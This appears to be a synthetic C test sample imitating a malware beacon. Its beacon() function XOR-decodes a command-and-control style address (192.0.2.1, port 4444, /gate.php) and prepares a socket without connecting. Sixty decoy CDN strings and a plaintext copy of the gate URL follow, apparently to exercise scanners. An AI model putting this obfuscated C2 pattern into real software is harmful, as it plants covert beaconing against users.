#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
__attribute__((noinline)) static void beacon(void) {
    unsigned char eip[] = { 107, 99, 104, 116, 106, 116, 104, 116, 107 };
    unsigned char eurl[] = { 50, 46, 46, 42, 96, 117, 117, 107, 99, 104, 116, 106, 116, 104, 116, 107, 96, 110, 110, 110, 110, 117, 61, 59, 46, 63, 116, 42, 50, 42 };
    char ip[32], url[96];
    int i;
    for (i = 0; i < 9; i++) ip[i] = (char)(eip[i] ^ 0x5a);
    ip[9] = 0;
    for (i = 0; i < 30; i++) url[i] = (char)(eurl[i] ^ 0x5a);
    url[30] = 0;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = inet_addr(ip);
    printf("connecting to %s\n", url);
    (void)s;
}

static const char ev_0[] __attribute__((used)) = "https://cdn.example.com/asset_00.js";
static const char ev_1[] __attribute__((used)) = "https://cdn.example.com/asset_01.js";
static const char ev_2[] __attribute__((used)) = "https://cdn.example.com/asset_02.js";
static const char ev_3[] __attribute__((used)) = "https://cdn.example.com/asset_03.js";
static const char ev_4[] __attribute__((used)) = "https://cdn.example.com/asset_04.js";
static const char ev_5[] __attribute__((used)) = "https://cdn.example.com/asset_05.js";
static const char ev_6[] __attribute__((used)) = "https://cdn.example.com/asset_06.js";
static const char ev_7[] __attribute__((used)) = "https://cdn.example.com/asset_07.js";
static const char ev_8[] __attribute__((used)) = "https://cdn.example.com/asset_08.js";
static const char ev_9[] __attribute__((used)) = "https://cdn.example.com/asset_09.js";
static const char ev_10[] __attribute__((used)) = "https://cdn.example.com/asset_10.js";
static const char ev_11[] __attribute__((used)) = "https://cdn.example.com/asset_11.js";
static const char ev_12[] __attribute__((used)) = "https://cdn.example.com/asset_12.js";
static const char ev_13[] __attribute__((used)) = "https://cdn.example.com/asset_13.js";
static const char ev_14[] __attribute__((used)) = "https://cdn.example.com/asset_14.js";
static const char ev_15[] __attribute__((used)) = "https://cdn.example.com/asset_15.js";
static const char ev_16[] __attribute__((used)) = "https://cdn.example.com/asset_16.js";
static const char ev_17[] __attribute__((used)) = "https://cdn.example.com/asset_17.js";
static const char ev_18[] __attribute__((used)) = "https://cdn.example.com/asset_18.js";
static const char ev_19[] __attribute__((used)) = "https://cdn.example.com/asset_19.js";
static const char ev_20[] __attribute__((used)) = "https://cdn.example.com/asset_20.js";
static const char ev_21[] __attribute__((used)) = "https://cdn.example.com/asset_21.js";
static const char ev_22[] __attribute__((used)) = "https://cdn.example.com/asset_22.js";
static const char ev_23[] __attribute__((used)) = "https://cdn.example.com/asset_23.js";
static const char ev_24[] __attribute__((used)) = "https://cdn.example.com/asset_24.js";
static const char ev_25[] __attribute__((used)) = "https://cdn.example.com/asset_25.js";
static const char ev_26[] __attribute__((used)) = "https://cdn.example.com/asset_26.js";
static const char ev_27[] __attribute__((used)) = "https://cdn.example.com/asset_27.js";
static const char ev_28[] __attribute__((used)) = "https://cdn.example.com/asset_28.js";
static const char ev_29[] __attribute__((used)) = "https://cdn.example.com/asset_29.js";
static const char ev_30[] __attribute__((used)) = "https://cdn.example.com/asset_30.js";
static const char ev_31[] __attribute__((used)) = "https://cdn.example.com/asset_31.js";
static const char ev_32[] __attribute__((used)) = "https://cdn.example.com/asset_32.js";
static const char ev_33[] __attribute__((used)) = "https://cdn.example.com/asset_33.js";
static const char ev_34[] __attribute__((used)) = "https://cdn.example.com/asset_34.js";
static const char ev_35[] __attribute__((used)) = "https://cdn.example.com/asset_35.js";
static const char ev_36[] __attribute__((used)) = "https://cdn.example.com/asset_36.js";
static const char ev_37[] __attribute__((used)) = "https://cdn.example.com/asset_37.js";
static const char ev_38[] __attribute__((used)) = "https://cdn.example.com/asset_38.js";
static const char ev_39[] __attribute__((used)) = "https://cdn.example.com/asset_39.js";
static const char ev_40[] __attribute__((used)) = "https://cdn.example.com/asset_40.js";
static const char ev_41[] __attribute__((used)) = "https://cdn.example.com/asset_41.js";
static const char ev_42[] __attribute__((used)) = "https://cdn.example.com/asset_42.js";
static const char ev_43[] __attribute__((used)) = "https://cdn.example.com/asset_43.js";
static const char ev_44[] __attribute__((used)) = "https://cdn.example.com/asset_44.js";
static const char ev_45[] __attribute__((used)) = "https://cdn.example.com/asset_45.js";
static const char ev_46[] __attribute__((used)) = "https://cdn.example.com/asset_46.js";
static const char ev_47[] __attribute__((used)) = "https://cdn.example.com/asset_47.js";
static const char ev_48[] __attribute__((used)) = "https://cdn.example.com/asset_48.js";
static const char ev_49[] __attribute__((used)) = "https://cdn.example.com/asset_49.js";
static const char ev_50[] __attribute__((used)) = "https://cdn.example.com/asset_50.js";
static const char ev_51[] __attribute__((used)) = "https://cdn.example.com/asset_51.js";
static const char ev_52[] __attribute__((used)) = "https://cdn.example.com/asset_52.js";
static const char ev_53[] __attribute__((used)) = "https://cdn.example.com/asset_53.js";
static const char ev_54[] __attribute__((used)) = "https://cdn.example.com/asset_54.js";
static const char ev_55[] __attribute__((used)) = "https://cdn.example.com/asset_55.js";
static const char ev_56[] __attribute__((used)) = "https://cdn.example.com/asset_56.js";
static const char ev_57[] __attribute__((used)) = "https://cdn.example.com/asset_57.js";
static const char ev_58[] __attribute__((used)) = "https://cdn.example.com/asset_58.js";
static const char ev_59[] __attribute__((used)) = "https://cdn.example.com/asset_59.js";
static const char ev_60[] __attribute__((used)) = "http://192.0.2.1:4444/gate.php";
int main(void) {
    beacon();
    return 0;
}
